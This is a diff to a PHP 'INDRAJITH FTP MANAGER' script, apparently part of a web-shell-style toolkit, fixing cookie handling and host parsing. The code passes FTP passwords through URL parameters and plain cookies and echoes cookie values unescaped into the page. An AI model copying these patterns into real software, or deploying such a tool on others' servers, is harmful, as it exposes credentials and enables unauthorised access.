@@ -72,9 +72,9 @@
 <?php
 @error_reporting(4);
 $user = $_COOKIE['ftpuser'];
-$passwd = $_COOKIE['ftppassword'];
+$passwd = !$_COOKIE['ftppassword']?"":$_COOKIE['ftppassword'];
 $host = $_COOKIE['host'];
-if($user=="" && $passwd=="")
+if($user=="")
 {
 	if(isset($_GET['host']) && isset($_GET['usrname']) && isset($_GET['passwrd']))
 	{
@@ -83,6 +83,9 @@ if($user=="" && $passwd=="")
 		setcookie("ftppassword", $_GET['passwrd']);
 		setcookie("host", $_GET['host']);
 		print "<script>window.location='?'</script>";
+		$user = $_COOKIE['ftpuser'];
+		$passwd = !$_COOKIE['ftppassword']?"":$_COOKIE['ftppassword'];
+		$host = $_COOKIE['host'];		
 	}
 	else {
 		echo '<title>INDRAJITH FTP MNAGER v.1.0</title><center>
@@ -108,6 +111,7 @@ if($user=="" && $passwd=="")
 
 
 <?php
+
 urldecode($str);
 $self=$_SERVER['PHP_SELF'];
 $srvr_sof=$_SERVER['SERVER_SOFTWARE'];
@@ -129,7 +133,7 @@ else
 
 $user = $_COOKIE['ftpuser'];
 $passwd = $_COOKIE['ftppassword'];
-$host = str_replace($_COOKIE['host'], "ftp://", "");
+$host = str_replace("ftp://", "", $_COOKIE['host']);
 $connect = ftp_connect($host);
 if(!$connect)
 {
@@ -155,7 +159,7 @@ echo "<title>INDRAJITH FTP MANAGER v.1.0</title><div id=result>
             </td>
             <td>
             <div class=\"header\">OS</font> <font color=\"#666\" >:</font>
-            ".$ox." </font> <font color=\"#666\" >|</font> ".php_uname()."<br />Host: <font color=red><a style='color:red;' href='".$_COOKIE['host']."'>".$_COOKIE['host']."</a></font><br />
+            ".$ox." </font> <font color=\"#666\" >|</font> ".php_uname()."<br />Host: <font color=red><a style='color:red;' href='ftp://".$host."'>".$host."</a></font><br />
             Your IP : <font color=red>".$your_ip."</font> <font color=\"#666\" >|</font> Server IP : <font color=red>".$srvr_ip."</font> <font color=\"#666\" > | </font> Admin <font color=\"#666\" > : </font> <font color=red> {$admin} </font> <br />FTP OS: <font color=red>".ftp_systype($connect)."</font> | Time Out: <font color=red>".ftp_get_option($connect, FTP_TIMEOUT_SEC)." Sec</font> <br />
             <a style='color:red; size:10px; ' href='?logout'>Logout</a></font><br />";
             echo "
@@ -178,17 +182,6 @@ function success($str)
 	ftp_man_bg();
 }
 
-function curlx()
-{
-    if(function_exists('curl_version'))
-    {
-        echo "<font color='red'>Enabled</font>";
-    }
-    else
-    {
-        echo "<font color='green'>Disabled</font>";
-    } 
-}
 function failed($str)
 {
 	echo "<div id='alert'><a class=\"alert_red\" href=\"#alert\">".$str."</a></div>";
@@ -324,7 +317,6 @@ function deleteDir($file, $cdir)
 	ftp_rmdir($connect, $file);
 	foreach ($arraay as $key)
 	{
-		print $fpath."/".$file."/".$key['name']."<br />";
 		if($key['type']!='Directory')
 		{
 			deleteFiledd($fpath."/".$file."/".$key['name']);
@@ -438,7 +430,7 @@ else
 }
 function ftp_man_bg()
 {
-	global $fpath, $connect;
+	global $fpath, $connect, $host;
 	$path=!empty($_GET['path'])?$_GET['path']:getcwd();
     $dirs=array();
     $fils=array();
